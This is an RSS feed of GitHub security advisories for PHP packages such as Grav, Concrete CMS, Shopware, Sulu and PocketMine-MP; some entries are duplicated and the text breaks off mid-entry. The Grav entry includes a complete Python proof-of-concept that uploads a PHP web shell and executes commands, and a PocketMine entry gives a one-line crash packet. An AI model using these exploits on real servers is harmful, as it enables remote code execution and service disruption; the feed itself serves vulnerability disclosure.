<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/composer.rss</id>
    <title>Security Advisory for PHP packages hosted at packagist.org</title>
    <updated>2024-03-15T13:01:17.712Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer"/>
    <subtitle>Security Advisory for PHP packages hosted at packagist.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[remdex/livehelperchat] livehelperchat Server-Side Template Injection]]></title>
        <id>https://github.com/advisories/GHSA-v4cp-2q7v-hg9q</id>
        <link href="https://github.com/advisories/GHSA-v4cp-2q7v-hg9q"/>
        <updated>2024-03-10T05:01:00.000Z</updated>
        <content type="html"><![CDATA[<p>livehelperchat 4.28v is vulnerable to Server-Side Template Injection (SSTI).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27516">https://nvd.nist.gov/vuln/detail/CVE-2024-27516</a></li>
<li><a href="https://github.com/LiveHelperChat/livehelperchat/issues/2054">https://github.com/LiveHelperChat/livehelperchat/issues/2054</a></li>
<li><a href="https://github.com/LiveHelperChat/livehelperchat/commit/a61d231526a36d4a7d8cc957914799ee1f9db0ab">https://github.com/LiveHelperChat/livehelperchat/commit/a61d231526a36d4a7d8cc957914799ee1f9db0ab</a></li>
<li><a href="https://github.com/advisories/GHSA-v4cp-2q7v-hg9q">https://github.com/advisories/GHSA-v4cp-2q7v-hg9q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v4cp-2q7v-hg9q</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-02-29T03:33:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[concrete5/concrete5] Concrete CMS Stored XSS in Layout Preset Name]]></title>
        <id>https://github.com/advisories/GHSA-x577-gcc9-9xjj</id>
        <link href="https://github.com/advisories/GHSA-x577-gcc9-9xjj"/>
        <updated>2024-03-10T05:00:59.000Z</updated>
        <content type="html"><![CDATA[<p>Concrete CMS before 8.5.14 and 9 before 9.2.3 is vulnerable to an admin adding a stored XSS payload via the Layout Preset name.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-48650">https://nvd.nist.gov/vuln/detail/CVE-2023-48650</a></li>
<li><a href="https://documentation.concretecms.org/developers/introduction/version-history/923-release-notes">https://documentation.concretecms.org/developers/introduction/version-history/923-release-notes</a></li>
<li><a href="https://www.concretecms.org/about/project-news/security/2023-12-05-concrete-cms-new-cves-and-cve-updates">https://www.concretecms.org/about/project-news/security/2023-12-05-concrete-cms-new-cves-and-cve-updates</a></li>
<li><a href="https://github.com/concretecms/concretecms/commit/077755e6bbbc1c67b7508add9e3d207e8d8909a0">https://github.com/concretecms/concretecms/commit/077755e6bbbc1c67b7508add9e3d207e8d8909a0</a></li>
<li><a href="https://github.com/concretecms/concretecms/commit/5b93470bcccf271810d3a0b190368ce6a9d6c84b">https://github.com/concretecms/concretecms/commit/5b93470bcccf271810d3a0b190368ce6a9d6c84b</a></li>
<li><a href="https://github.com/advisories/GHSA-x577-gcc9-9xjj">https://github.com/advisories/GHSA-x577-gcc9-9xjj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x577-gcc9-9xjj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-02-29T03:33:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[concrete5/concrete5] Concrete CMS Stored XSS in Layout Preset Name]]></title>
        <id>https://github.com/advisories/GHSA-x577-gcc9-9xjj</id>
        <link href="https://github.com/advisories/GHSA-x577-gcc9-9xjj"/>
        <updated>2024-03-10T05:00:59.000Z</updated>
        <content type="html"><![CDATA[<p>Concrete CMS before 8.5.14 and 9 before 9.2.3 is vulnerable to an admin adding a stored XSS payload via the Layout Preset name.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-48650">https://nvd.nist.gov/vuln/detail/CVE-2023-48650</a></li>
<li><a href="https://documentation.concretecms.org/developers/introduction/version-history/923-release-notes">https://documentation.concretecms.org/developers/introduction/version-history/923-release-notes</a></li>
<li><a href="https://www.concretecms.org/about/project-news/security/2023-12-05-concrete-cms-new-cves-and-cve-updates">https://www.concretecms.org/about/project-news/security/2023-12-05-concrete-cms-new-cves-and-cve-updates</a></li>
<li><a href="https://github.com/concretecms/concretecms/commit/077755e6bbbc1c67b7508add9e3d207e8d8909a0">https://github.com/concretecms/concretecms/commit/077755e6bbbc1c67b7508add9e3d207e8d8909a0</a></li>
<li><a href="https://github.com/concretecms/concretecms/commit/5b93470bcccf271810d3a0b190368ce6a9d6c84b">https://github.com/concretecms/concretecms/commit/5b93470bcccf271810d3a0b190368ce6a9d6c84b</a></li>
<li><a href="https://github.com/advisories/GHSA-x577-gcc9-9xjj">https://github.com/advisories/GHSA-x577-gcc9-9xjj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x577-gcc9-9xjj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-02-29T03:33:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[concrete5/concrete5] Concrete CMS Stored Cross-site Scripting vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-4m7h-34xm-4wjv</id>
        <link href="https://github.com/advisories/GHSA-4m7h-34xm-4wjv"/>
        <updated>2024-03-06T17:05:06.000Z</updated>
        <content type="html"><![CDATA[<p>Concrete CMS version 9 before 9.2.7 is vulnerable to Stored XSS via the Name field of a Group type since there is insufficient validation of administrator provided data for that field. A rogue administrator could inject malicious code into the Name field which might be executed when users visit the affected page. The Concrete CMS security team gave this vulnerability a CVSS v3.1 score of 2.2 with a vector of AV:N/AC:H/PR:H/UI:N/S:U/C:L/I:N/A:N  Concrete versions below 9 do not include group types so they are not affected by this vulnerability. Thanks Luca Fuda for reporting.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-2179">https://nvd.nist.gov/vuln/detail/CVE-2024-2179</a></li>
<li><a href="https://documentation.concretecms.org/9-x/developers/introduction/version-history/927-release-notes">https://documentation.concretecms.org/9-x/developers/introduction/version-history/927-release-notes</a></li>
<li><a href="https://github.com/concretecms/concretecms/commit/ac1ec9b069acac79869b2988e1f56cc5565a3dd4">https://github.com/concretecms/concretecms/commit/ac1ec9b069acac79869b2988e1f56cc5565a3dd4</a></li>
<li><a href="https://github.com/advisories/GHSA-4m7h-34xm-4wjv">https://github.com/advisories/GHSA-4m7h-34xm-4wjv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4m7h-34xm-4wjv</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-03-05T21:30:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pocketmine/pocketmine-mp] PocketMine-MP server crash with certain invalid JSON payloads in `LoginPacket` due to dependency vulnerability (3rd time)]]></title>
        <id>https://github.com/advisories/GHSA-h6j3-j35f-v2x7</id>
        <link href="https://github.com/advisories/GHSA-h6j3-j35f-v2x7"/>
        <updated>2024-03-06T17:02:08.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An attacker could crash the server by sending malformed JWT JSON in LoginPacket due to a security vulnerability in <a href="https://github.com/cweiske/JsonMapper">netresearch/jsonmapper</a>, due to attempting to construct objects from scalar types by default without any validation, with unexpected results that caused PocketMine-MP to crash.</p>
<p>Due to the relatively high number of security issues arising from this specific dependency, the team is exploring options to replace it.</p>
<h3 id="patches">Patches</h3>
<p>In the meantime, the issue was fixed by pmmp/netresearch-jsonmapper@b96a209f9e8b76b899a0d0918493cd87eb3c02a7 and 6872661fd03649cc7a8762c41c16e9ee5a4de1c9.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Detecting the malicious data that triggers this issue is of rather high difficulty, so it's not likely that a plugin would be able to easily remediate this.</p>
<h3 id="references">References</h3>
<p><a href="https://github.com/cweiske/jsonmapper/issues/226">https://github.com/cweiske/jsonmapper/issues/226</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/pmmp/PocketMine-MP/security/advisories/GHSA-h6j3-j35f-v2x7">https://github.com/pmmp/PocketMine-MP/security/advisories/GHSA-h6j3-j35f-v2x7</a></li>
<li><a href="https://github.com/cweiske/jsonmapper/issues/226">https://github.com/cweiske/jsonmapper/issues/226</a></li>
<li><a href="https://github.com/pmmp/PocketMine-MP/commit/6872661fd03649cc7a8762c41c16e9ee5a4de1c9">https://github.com/pmmp/PocketMine-MP/commit/6872661fd03649cc7a8762c41c16e9ee5a4de1c9</a></li>
<li><a href="https://github.com/pmmp/netresearch-jsonmapper/commit/b96a209f9e8b76b899a0d0918493cd87eb3c02a7">https://github.com/pmmp/netresearch-jsonmapper/commit/b96a209f9e8b76b899a0d0918493cd87eb3c02a7</a></li>
<li><a href="https://github.com/advisories/GHSA-h6j3-j35f-v2x7">https://github.com/advisories/GHSA-h6j3-j35f-v2x7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h6j3-j35f-v2x7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-06T17:02:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pocketmine/pocketmine-mp] PocketMine-MP BookEditPacket crash when inventory slot in the packet is invalid]]></title>
        <id>https://github.com/advisories/GHSA-xc7j-wj36-qjfr</id>
        <link href="https://github.com/advisories/GHSA-xc7j-wj36-qjfr"/>
        <updated>2024-03-06T17:01:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>If a client sends a BookEditPacket with InventorySlot greater than 35, the server will crash due to an unhandled exception thrown by <code>BaseInventory-&gt;getItem()</code>.</p>
<h3 id="details">Details</h3>
<p>Crashes at <a href="https://github.com/pmmp/PocketMine-MP/blob/b744e09352a714d89220719ab6948a010ac636fc/src/network/mcpe/handler/InGamePacketHandler.php#L873">https://github.com/pmmp/PocketMine-MP/blob/b744e09352a714d89220719ab6948a010ac636fc/src/network/mcpe/handler/InGamePacketHandler.php#L873</a></p>
<h3 id="poc">PoC</h3>
<p>Using Gophertunnel, use <code>serverConn.WritePacket(&amp;packet.BookEdit{InventorySlot: 36})</code></p>
<h3 id="impact">Impact</h3>
<p>Server crash, all servers</p>
<h3 id="patched-versions">Patched versions</h3>
<p>This issue was fixed by 47f011966092f275cc1b11f8de635e89fd9651a7, and the fix was released in 5.11.2.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pmmp/PocketMine-MP/security/advisories/GHSA-xc7j-wj36-qjfr">https://github.com/pmmp/PocketMine-MP/security/advisories/GHSA-xc7j-wj36-qjfr</a></li>
<li><a href="https://github.com/pmmp/PocketMine-MP/commit/47f011966092f275cc1b11f8de635e89fd9651a7">https://github.com/pmmp/PocketMine-MP/commit/47f011966092f275cc1b11f8de635e89fd9651a7</a></li>
<li><a href="https://github.com/pmmp/PocketMine-MP/blob/b744e09352a714d89220719ab6948a010ac636fc/src/network/mcpe/handler/InGamePacketHandler.php#L873">https://github.com/pmmp/PocketMine-MP/blob/b744e09352a714d89220719ab6948a010ac636fc/src/network/mcpe/handler/InGamePacketHandler.php#L873</a></li>
<li><a href="https://github.com/advisories/GHSA-xc7j-wj36-qjfr">https://github.com/advisories/GHSA-xc7j-wj36-qjfr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xc7j-wj36-qjfr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-06T17:01:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[getgrav/grav] Remote Code Execution by uploading a phar file using frontmatter]]></title>
        <id>https://github.com/advisories/GHSA-f6g2-h7qv-3m5v</id>
        <link href="https://github.com/advisories/GHSA-f6g2-h7qv-3m5v"/>
        <updated>2024-03-06T16:58:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<ul>
<li>Due to insufficient permission verification, user who can write a page use frontmatter feature.</li>
<li>Inadequate File Name Validation</li>
</ul>
<h3 id="details">Details</h3>
<ol>
<li>Insufficient Permission Verification</li>
</ol>
<p>In Grav CMS, "<a href="https://learn.getgrav.org/17/content/headers">Frontmatter</a>" refers to the metadata block located at the top of a Markdown file. Frontmatter serves the purpose of providing additional information about a specific page or post.
In this feature, only administrators are granted access, while regular users who can create pages are not. However, if a regular user adds the data[_json][header][form] parameter to the POST Body while creating a page, they can use Frontmatter. The demonstration of this vulnerability is provided in video format. <a href="https://www.youtube.com/watch?v=EU1QA0idoWE">Video Link</a></p>
<ol start="2">
<li>Inadequate File Name Validation</li>
</ol>
<p>To create a Contact Form, Frontmatter and markdown can be written as follows:
<a href="https://learn.getgrav.org/17/forms/forms/example-form">Contact Form Example</a>
<a href="https://learn.getgrav.org/17/forms/forms/reference-form-actions#save">Form Action Save Option</a>
When an external user submits the Contact Form after filling it out, the data is stored in the user/data folder. The filename under which the data is stored corresponds to the value specified in the filename attribute of the process property. For instance, if the filename attribute has a value of "feedback.txt," a feedback.txt file is created in the user/data/contact folder. This file contains the value entered by the user in the "name" field. The problem with this functionality is the lack of validation for the filename attribute, potentially allowing the creation of files such as phar files on the server. An attacker could input arbitrary PHP code into the "name" field to be saved on the server. However, Grav filter the &lt; and &gt; characters, so to disable these options, an xss_check: false attribute should be added. <a href="https://learn.getgrav.org/17/forms/forms/form-options#xss-checks">Disable XSS</a></p>
<pre><code>---
title: Contact Form

form:
    name: contact
    xss_check: false

    fields:
        name:
          label: Name
          placeholder: Enter your name
          autocomplete: on
          type: text
          validate:
            required: true

    buttons:
        submit:
          type: submit
          value: Submit

    process:
        save:
            filename: this_is_file_name.phar
            operation: add

---

# Contact form

Some sample page content
</code></pre>
<p>Exploiting these two vulnerabilities allows the following scenario:</p>
<ul>
<li>A regular user account capable of creating pages is required.</li>
<li>An attacker creates a Contact Form page containing malicious Frontmatter using the regular user's account.</li>
<li>Accessing the Contact Form page, the attacker submits PHP code.</li>
<li>The attacker attempts Remote Code Execution by accessing HOST/user/data/[form-name]/[filename].</li>
</ul>
<h3 id="poc">PoC</h3>
<p><a href="https://www.youtube.com/watch?v=Gh3ezpORbPc">PoC Video Link</a></p>
<pre><code class="language-python"># PoC.py
import requests
from bs4 import BeautifulSoup

class Poc:

    def __init__(self, cmd):
        self.sess = requests.Session()

        ##########    INIT    ################
        self.USERNAME = "guest"
        self.PASSWORD = "Guest123!"
        self.PREFIX_URL = "http://192.168.12.119:8888/grav"
        self.PAGE_NAME = "this_is_poc_page47"
        self.PHP_FILE_NAME = "universe.phar"
        self.PAYLOAD = '&lt;?php system($_GET["cmd"]); ?&gt;'
        self.cmd = cmd
        ##########    END    ################

        self.sess.get(self.PREFIX_URL)
        self._login()
        self._save_page()
        self._inject_command()
        self._execute_command()
    

    def _get_nonce(self, data, name):
        # Get login nonce value
        res = BeautifulSoup(data, "html.parser")
        return res.find("input", {"name" : name}).get("value")

    
    def _login(self):
        print("[*] Try to Login")
        res = self.sess.get(self.PREFIX_URL + "/admin")

        login_nonce = self._get_nonce(res.text, "login-nonce")

        # Login
        login_data = {
            "data[username]" : self.USERNAME,
            "data[password]" : self.PASSWORD,
            "task" : "login",
            "login-nonce" : login_nonce
        }
        res = self.sess.post(self.PREFIX_URL + "/admin", data=login_data)

        # Check login
        if res.status_code != 303:
            print("[!] username or password is wrong")
            exit()
        
        print("[*] Success Login")


    def _save_page(self):
        print("[*] Try to write page")

        res = self.sess.get(self.PREFIX_URL + f"/admin/pages/{self.PAGE_NAME}/:add")
        form_nonce = self._get_nonce(res.text, "form-nonce")
        unique_form_id = self._get_nonce(res.text, "__unique_form_id__")

        # Add page data
        page_data  = f"task=save&amp;data%5Bheader%5D%5Btitle%5D={self.PAGE_NAME}&amp;data%5Bcontent%5D=content&amp;data%5Bheader%5D%5Bsearch%5D=&amp;data%5Bfolder%5D={self.PAGE_NAME}&amp;data%5Broute%5D=&amp;data%5Bname%5D=form&amp;data%5Bheader%5D%5Bbody_classes%5D=&amp;data%5Bordering%5D=1&amp;data%5Border%5D=&amp;data%5Bheader%5D%5Border_by%5D=&amp;data%5Bheader%5D%5Border_manual%5D=&amp;data%5Bblueprint%5D=&amp;data%5Blang%5D=&amp;_post_entries_save=edit&amp;__form-name__=flex-pages&amp;__unique_form_id__={unique_form_id}&amp;form-nonce={form_nonce}&amp;toggleable_data%5Bheader%5D%5Bpublished%5D=0&amp;toggleable_data%5Bheader%5D%5Bdate%5D=0&amp;toggleable_data%5Bheader%5D%5Bpublish_date%5D=0&amp;toggleable_data%5Bheader%5D%5Bunpublish_date%5D=0&amp;toggleable_data%5Bheader%5D%5Bmetadata%5D=0&amp;toggleable_data%5Bheader%5D%5Bdateformat%5D=0&amp;toggleable_data%5Bheader%5D%5Bmenu%5D=0&amp;toggleable_data%5Bheader%5D%5Bslug%5D=0&amp;toggleable_data%5Bheader%5D%5Bredirect%5D=0&amp;toggleable_data%5Bheader%5D%5Bprocess%5D=0&amp;toggleable_data%5Bheader%5D%5Btwig_first%5D=0&amp;toggleable_data%5Bheader%5D%5Bnever_cache_twig%5D=0&amp;toggleable_data%5Bheader%5D%5Bchild_type%5D=0&amp;toggleable_data%5Bheader%5D%5Broutable%5D=0&amp;toggleable_data%5Bheader%5D%5Bcache_enable%5D=0&amp;toggleable_data%5Bheader%5D%5Bvisible%5D=0&amp;toggleable_data%5Bheader%5D%5Bdebugger%5D=0&amp;toggleable_data%5Bheader%5D%5Btemplate%5D=0&amp;toggleable_data%5Bheader%5D%5Bappend_url_extension%5D=0&amp;toggleable_data%5Bheader%5D%5Bredirect_default_route%5D=0&amp;toggleable_data%5Bheader%5D%5Broutes%5D%5Bdefault%5D=0&amp;toggleable_data%5Bheader%5D%5Broutes%5D%5Bcanonical%5D=0&amp;toggleable_data%5Bheader%5D%5Broutes%5D%5Baliases%5D=0&amp;toggleable_data%5Bheader%5D%5Badmin%5D%5Bchildren_display_order%5D=0&amp;toggleable_data%5Bheader%5D%5Blogin%5D%5Bvisibility_requires_access%5D=0"
        page_data += f"&amp;data%5B_json%5D%5Bheader%5D%5Bform%5D=%7B%22xss_check%22%3Afalse%2C%22name%22%3A%22contact-form%22%2C%22fields%22%3A%7B%22name%22%3A%7B%22label%22%3A%22Name%22%2C%22placeholder%22%3A%22Enter+php+code%22%2C%22autofocus%22%3A%22on%22%2C%22autocomplete%22%3A%22on%22%2C%22type%22%3A%22text%22%2C%22validate%22%3A%7B%22required%22%3Atrue%7D%7D%7D%2C%22process%22%3A%7B%22save%22%3A%7B%22filename%22%3A%22{self.PHP_FILE_NAME}%22%2C%22operation%22%3A%22add%22%7D%7D%2C%22buttons%22%3A%7B%22submit%22%3A%7B%22type%22%3A%22submit%22%2C%22value%22%3A%22Submit%22%7D%7D%7D"
        res = self.sess.post(self.PREFIX_URL + f"/admin/pages/{self.PAGE_NAME}/:add" , data = page_data, headers = {'Content-Type': 'application/x-www-form-urlencoded'})

        print("[*] Success write page: " + self.PREFIX_URL + f"/{self.PAGE_NAME}")


    def _inject_command(self):
        print("[*] Try to inject php code")

        res = self.sess.get(self.PREFIX_URL + f"/{self.PAGE_NAME}")
        form_nonce = self._get_nonce(res.text, "form-nonce")
        unique_form_id = self._get_nonce(res.text, "__unique_form_id__")

        form_data = f"data%5Bname%5D={self.PAYLOAD}&amp;__form-name__=contact-form&amp;__unique_form_id__={unique_form_id}&amp;form-nonce={form_nonce}"

        res = self.sess.post(self.PREFIX_URL + f"/{self.PAGE_NAME}" , data = form_data, headers = {'Content-Type': 'application/x-www-form-urlencoded'})

        print("[*] Success inject php code")


    def _execute_command(self):
        res = self.sess.get(self.PREFIX_URL + f"/user/data/contact-form/{self.PHP_FILE_NAME}?cmd={self.cmd}")

        if res.status_code == 404:
            print("[!] Fail to execute command or not save php file.")
            exit()

        print("[*] This is uploaded php file url.")
        print(self.PREFIX_URL + f"/user/data/contact-form/{self.PHP_FILE_NAME}?cmd={self.cmd}")
        print(res.text)


if __name__ == "__main__":
    Poc(cmd="id")
</code></pre>
<h3 id="impact">Impact</h3>
<p>Remote Code Execution</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/getgrav/grav/security/advisories/GHSA-f6g2-h7qv-3m5v">https://github.com/getgrav/grav/security/advisories/GHSA-f6g2-h7qv-3m5v</a></li>
<li><a href="https://github.com/getgrav/grav/commit/e3b0aa0c502aad251c1b79d1ee973dcd93711f07">https://github.com/getgrav/grav/commit/e3b0aa0c502aad251c1b79d1ee973dcd93711f07</a></li>
<li><a href="https://github.com/advisories/GHSA-f6g2-h7qv-3m5v">https://github.com/advisories/GHSA-f6g2-h7qv-3m5v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f6g2-h7qv-3m5v</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-03-06T16:58:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[shopware/platform] Shopware's session is persistent in Cache for 404 pages]]></title>
        <id>https://github.com/advisories/GHSA-c2f9-4jmm-v45m</id>
        <link href="https://github.com/advisories/GHSA-c2f9-4jmm-v45m"/>
        <updated>2024-03-06T15:07:40.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The Symfony Session Handler, pop's the Session Cookie and assign it to the Response. Since Shopware 6.5.8.0 the 404 pages, are cached, to improve the performance of 404 pages. So the cached Response, contains a Session Cookie when the Browser accessing the 404 page, has no cookies yet. The Symfony Session Handler is in use, when no explicit Session configuration has been done.
When Redis is in use for Sessions using the PHP Redis extension, this exploiting code is not used.</p>
<h3 id="patches">Patches</h3>
<p>Update to Shopware version 6.5.8.7</p>
<h3 id="workarounds">Workarounds</h3>
<p>Using Redis for Sessions, as this does not trigger the exploit code. Example configuration for Redis</p>
<pre><code class="language-ini"># php.ini
session.save_handler = redis
session.save_path = "tcp://127.0.0.1:6379"
</code></pre>
<h2 id="consequences">Consequences</h2>
<p>As an guest browser session has been cached on a 404 page, every missing image or directly reaching a 404 page will logout the customer or clear his cart.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/shopware/shopware/security/advisories/GHSA-c2f9-4jmm-v45m">https://github.com/shopware/shopware/security/advisories/GHSA-c2f9-4jmm-v45m</a></li>
<li><a href="https://github.com/shopware/shopware/commit/7d9cb03225efca5f97e69b800d8747598dd15ce3">https://github.com/shopware/shopware/commit/7d9cb03225efca5f97e69b800d8747598dd15ce3</a></li>
<li><a href="https://github.com/shopware/storefront/commit/3477e4a425d3c54b4bfae82d703fe3838dc21d3e">https://github.com/shopware/storefront/commit/3477e4a425d3c54b4bfae82d703fe3838dc21d3e</a></li>
<li><a href="https://github.com/shopware/shopware/releases/tag/v6.5.8.7">https://github.com/shopware/shopware/releases/tag/v6.5.8.7</a></li>
<li><a href="https://github.com/advisories/GHSA-c2f9-4jmm-v45m">https://github.com/advisories/GHSA-c2f9-4jmm-v45m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c2f9-4jmm-v45m</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-03-06T15:06:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[shopware/storefront] Shopware's session is persistent in Cache for 404 pages]]></title>
        <id>https://github.com/advisories/GHSA-c2f9-4jmm-v45m</id>
        <link href="https://github.com/advisories/GHSA-c2f9-4jmm-v45m"/>
        <updated>2024-03-06T15:07:40.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The Symfony Session Handler, pop's the Session Cookie and assign it to the Response. Since Shopware 6.5.8.0 the 404 pages, are cached, to improve the performance of 404 pages. So the cached Response, contains a Session Cookie when the Browser accessing the 404 page, has no cookies yet. The Symfony Session Handler is in use, when no explicit Session configuration has been done.
When Redis is in use for Sessions using the PHP Redis extension, this exploiting code is not used.</p>
<h3 id="patches">Patches</h3>
<p>Update to Shopware version 6.5.8.7</p>
<h3 id="workarounds">Workarounds</h3>
<p>Using Redis for Sessions, as this does not trigger the exploit code. Example configuration for Redis</p>
<pre><code class="language-ini"># php.ini
session.save_handler = redis
session.save_path = "tcp://127.0.0.1:6379"
</code></pre>
<h2 id="consequences">Consequences</h2>
<p>As an guest browser session has been cached on a 404 page, every missing image or directly reaching a 404 page will logout the customer or clear his cart.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/shopware/shopware/security/advisories/GHSA-c2f9-4jmm-v45m">https://github.com/shopware/shopware/security/advisories/GHSA-c2f9-4jmm-v45m</a></li>
<li><a href="https://github.com/shopware/shopware/commit/7d9cb03225efca5f97e69b800d8747598dd15ce3">https://github.com/shopware/shopware/commit/7d9cb03225efca5f97e69b800d8747598dd15ce3</a></li>
<li><a href="https://github.com/shopware/storefront/commit/3477e4a425d3c54b4bfae82d703fe3838dc21d3e">https://github.com/shopware/storefront/commit/3477e4a425d3c54b4bfae82d703fe3838dc21d3e</a></li>
<li><a href="https://github.com/shopware/shopware/releases/tag/v6.5.8.7">https://github.com/shopware/shopware/releases/tag/v6.5.8.7</a></li>
<li><a href="https://github.com/advisories/GHSA-c2f9-4jmm-v45m">https://github.com/advisories/GHSA-c2f9-4jmm-v45m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c2f9-4jmm-v45m</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-03-06T15:06:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sulu/sulu] Sulu grants access to pages regardless of role permissions]]></title>
        <id>https://github.com/advisories/GHSA-jr83-m233-gg6p</id>
        <link href="https://github.com/advisories/GHSA-jr83-m233-gg6p"/>
        <updated>2024-03-06T21:37:50.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><em>What kind of vulnerability is it? Who is impacted?</em></p>
<p>Access to pages is granted regardless of role permissions for webspaces which have a security system configured and permission check enabled. Webspaces without do not have this issue.</p>
<h3 id="patches">Patches</h3>
<p>Has the problem been patched? What versions should users upgrade to?</p>
<p>The problem is patched with Version <code>2.4.17</code> and <code>2.5.13</code>.</p>
<h3 id="workarounds">Workarounds</h3>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>
<p>Remove  following lines from <code>vendor/symfony/security-http/HttpUtils.php</code>:</p>
<pre><code>-            // Shortcut if request has already been matched before
-            if ($request-&gt;attributes-&gt;has('_route')) {
-                return $path === $request-&gt;attributes-&gt;get('_route');
 -           }
</code></pre>
<p>Or do not install <code>symfony/security-http</code> versions greater equal than <code>v5.4.30</code> or <code>v6.3.6</code>.</p>
<h3 id="references">References</h3>
<p><em>Are there any links users can visit to find out more?</em></p>
<p>Currently no references.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/sulu/sulu/security/advisories/GHSA-jr83-m233-gg6p">https://github.com/sulu/sulu/security/advisories/GHSA-jr83-m233-gg6p</a></li>
<li><a href="https://github.com/sulu/sulu/commit/ec9c3f99e15336dc4f6877f512300f231c17c6da">https://github.com/sulu/sulu/commit/ec9c3f99e15336dc4f6877f512300f231c17c6da</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27915">https://nvd.nist.gov/vuln/detail/CVE-2024-27915</a></li>
<li><a href="https://github.com/advisories/GHSA-jr83-m233-gg6p">https://github.com/advisories/GHSA-jr83-m233-gg6p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jr83-m233-gg6p</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-04T20:45:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sulu/sulu] Sulu grants access to pages regardless of role permissions]]></title>
        <id>https://github.com/advisories/GHSA-jr83-m233-gg6p</id>
        <link href="https://github.com/advisories/GHSA-jr83-m233-gg6p"/>
        <updated>2024-03-06T21:37:50.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><em>What kind of vulnerability is it? Who is impacted?</em></p>
<p>Access to pages is granted regardless of role permissions for webspaces which have a security system configured and permission check enabled. Webspaces without do not have this issue.</p>
<h3 id="patches">Patches</h3>
<p>Has the problem been patched? What versions should users upgrade to?</p>
<p>The problem is patched with Version <code>2.4.17</code> and <code>2.5.13</code>.</p>
<h3 id="workarounds">Workarounds</h3>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>
<p>Remove  following lines from <code>vendor/symfony/security-http/HttpUtils.php</code>:</p>
<pre><code>-            // Shortcut if request has already been matched before
-            if ($request-&gt;attributes-&gt;has('_route')) {
-                return $path === $request-&gt;attributes-&gt;get('_route');
 -           }
</code></pre>
